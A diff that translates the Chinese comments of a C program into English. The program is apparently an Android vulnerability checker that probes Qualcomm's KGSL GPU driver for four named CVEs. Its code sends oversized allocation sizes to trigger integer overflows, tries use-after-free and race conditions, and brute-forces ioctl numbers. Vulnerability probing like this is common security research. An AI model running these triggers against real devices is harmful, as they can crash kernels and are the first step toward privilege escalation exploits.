@@ -1,13 +1,13 @@
 /*
- * kgsl_cve_check.c - 檢查已知的 KGSL CVE
+ * kgsl_cve_check.c - check for known KGSL CVEs
  *
- * 目標 CVE:
+ * Target CVEs:
  * - CVE-2023-33063: KGSL timeline UAF
  * - CVE-2023-33107: KGSL integer overflow
  * - CVE-2024-23380: KGSL GPU command UAF
  * - CVE-2023-21106: KGSL dispatcher
  *
- * 編譯:
+ * Build:
  * aarch64-linux-android31-clang -static -O2 -o kgsl_cve_check kgsl_cve_check.c
  */
 
@@ -28,7 +28,7 @@
 #define KGSL_IOC_MAGIC 0x09
 
 /* Timeline ioctls (CVE-2023-33063) */
-#define IOCTL_TIMELINE_CREATE 0xc010095d // 假設的編號
+#define IOCTL_TIMELINE_CREATE 0xc010095d // assumed number
 #define IOCTL_TIMELINE_DESTROY 0x4004095e
 #define IOCTL_TIMELINE_FENCE 0xc010095f
 #define IOCTL_TIMELINE_SIGNAL 0x40080960
@@ -54,11 +54,11 @@ void check_cve_2023_33063(int fd)
     printf("[*] Looking for timeline-related ioctls...\n");
 
     /*
-     * CVE-2023-33063 涉及 kgsl_timeline 的 UAF
-     * 當 timeline 被銷毀但還有活動的 fence 時
+     * CVE-2023-33063 involves a UAF in kgsl_timeline
+     * when the timeline is destroyed while an active fence still exists
      */
 
-    // 掃描可能的 timeline ioctls
+    // Scan the possible timeline ioctls
     uint64_t data[16] = {0};
 
     for (int nr = 0x5d; nr <= 0x65; nr++)
@@ -79,7 +79,7 @@ void check_cve_2023_33063(int fd)
         }
     }
 
-    // 嘗試特定的 timeline 操作
+    // Try specific timeline operations
     struct
     {
         uint32_t context_id;
@@ -101,12 +101,12 @@ void check_cve_2023_33107(int fd)
     printf("\n=== CVE-2023-33107: Integer Overflow ===\n");
 
     /*
-     * CVE-2023-33107 涉及 kgsl_ioctl_gpu_sparse_alloc_mem 中的整數溢出
-     * 當計算 (num_pages * sizeof(struct page*)) 溢出時
+     * CVE-2023-33107 involves an integer overflow in kgsl_ioctl_gpu_sparse_alloc_mem
+     * when the (num_pages * sizeof(struct page*)) computation overflows
      */
 
-    // 嘗試 sparse alloc (如果存在)
-    // GPUMEM_ALLOC_ID 可能有類似的問題
+    // Try sparse alloc (if it exists)
+    // GPUMEM_ALLOC_ID may have a similar problem
 
     struct
     {
@@ -120,8 +120,8 @@ void check_cve_2023_33107(int fd)
         uint32_t reserved[3];
     } alloc_req = {0};
 
-    // 嘗試觸發整數溢出
-    // size = 0x7FFFFFFFFFFFFFF0 可能導致 num_pages 計算溢出
+    // Try to trigger the integer overflow
+    // size = 0x7FFFFFFFFFFFFFF0 may make the num_pages computation overflow
 
     alloc_req.size = 0x7FFFFFFFFFFFFFF0ULL;
     alloc_req.flags = 0;
@@ -130,11 +130,11 @@ void check_cve_2023_33107(int fd)
     int ret = ioctl(fd, IOCTL_GPUMEM_ALLOC_ID, &alloc_req);
     printf("[*] GPUMEM_ALLOC_ID with huge size: ret=%d, errno=%d\n", ret, errno);
 
-    // 嘗試更多整數邊界
+    // Try more integer boundary values
     uint64_t overflow_sizes[] = {
         0xFFFFFFFFFFFFF000ULL, // -0x1000
         0x8000000000000000ULL, // MIN_LONG
-        0x0001000000000000ULL, // 大頁數
+        0x0001000000000000ULL, // large page count
     };
 
     for (int i = 0; i < 3; i++)
@@ -152,11 +152,11 @@ void check_cve_2024_23380(int fd)
     printf("\n=== CVE-2024-23380: GPU Command UAF ===\n");
 
     /*
-     * CVE-2024-23380 涉及 GPU 命令提交期間的 UAF
-     * 當命令被取消但仍有引用時
+     * CVE-2024-23380 involves a UAF during GPU command submission
+     * when the command is cancelled but references still exist
      */
 
-    // 嘗試 GPU_COMMAND
+    // Try GPU_COMMAND
     struct
     {
         uint64_t flags;
@@ -173,7 +173,7 @@ void check_cve_2024_23380(int fd)
         uint32_t timestamp;
     } cmd_req = {0};
 
-    // 創建一些緩衝區
+    // Create some buffers
     void *cmd_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 
@@ -188,7 +188,7 @@ void check_cve_2024_23380(int fd)
     printf("[*] GPU_COMMAND: ret=%d, errno=%d (%s)\n",
            ret, errno, strerror(errno));
 
-    // 嘗試 GPU_AUX_COMMAND
+    // Try GPU_AUX_COMMAND
     struct
     {
         uint64_t flags;
@@ -220,8 +220,8 @@ void check_dispatcher_race(int fd)
     printf("\n=== Dispatcher Race Condition Check ===\n");
 
     /*
-     * 許多 KGSL 漏洞涉及 dispatcher 的競態條件
-     * 嘗試並行操作來觸發
+     * Many KGSL vulnerabilities involve a race condition in the dispatcher
+     * Try concurrent operations to trigger it
      */
 
     // READTIMESTAMP
@@ -241,7 +241,7 @@ void check_dispatcher_race(int fd)
     printf("[*] READTIMESTAMP: ret=%d, errno=%d, ts=%u\n",
            ret, errno, ts_req.timestamp);
 
-    // 嘗試不同的 timestamp 類型
+    // Try different timestamp types
     for (int type = 0; type < 5; type++)
     {
         ts_req.type = type;
@@ -259,10 +259,10 @@ void check_perfcounter_vuln(int fd)
     printf("\n=== Perfcounter Vulnerability Check ===\n");
 
     /*
-     * KGSL perfcounter 操作曾有多個漏洞
+     * KGSL perfcounter operations have had several vulnerabilities
      */
 
-    // 嘗試 perfcounter 相關的 ioctl
+    // Try the perfcounter-related ioctls
     // nr 0x33 - GET_PERFCOUNTRREG
     // nr 0x3b - PERFCOUNTER_GET
     // nr 0x3c - PERFCOUNTER_PUT
@@ -311,10 +311,10 @@ void scan_all_kgsl_ioctls(int fd)
 
     int found = 0;
 
-    // 掃描所有可能的 KGSL ioctl
+    // Scan all possible KGSL ioctls
     for (int nr = 0x00; nr <= 0xFF; nr++)
     {
-        // 嘗試不同的 direction 和 size
+        // Try different directions and sizes
         struct
         {
             int cmd;
@@ -338,7 +338,7 @@ void scan_all_kgsl_ioctls(int fd)
             {
                 printf("[+] nr=0x%02x cmd=0x%08x: SUCCESS\n", nr, combos[c].cmd);
                 found++;
-                break; // 找到一個就跳過
+                break; // skip once one is found
             }
             else if (errno != ENOTTY && errno != EINVAL)
             {
